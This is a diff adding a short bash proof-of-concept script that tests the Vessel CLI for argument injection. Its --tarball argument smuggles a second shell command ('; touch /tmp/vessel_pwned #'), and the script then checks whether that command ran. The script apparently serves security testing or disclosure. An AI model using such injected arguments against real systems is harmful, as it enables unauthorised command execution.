@@ -1,0 +1,18 @@
+```bash
+#!/bin/bash
+# Proof of Concept: Simulating a malicious injection via Vessel CLI
+
+JAR_PATH="./target/vessel-0.2.161.jar"
+DUMMY_TAR="./dummy.tar"
+
+echo "[+] Attempting Argument Injection..."
+
+# This payload tries to create a file in /tmp to prove RCE
+java -jar $JAR_PATH push --tarball "$DUMMY_TAR; touch /tmp/vessel_pwned #" my-registry.nubank.com.br/test
+
+if [ -f /tmp/vessel_pwned ]; then
+    echo "[!] Success: Command executed!"
+    rm /tmp/vessel_pwned
+else
+    echo "[-] Failed: Check sanitization logic."
+fi
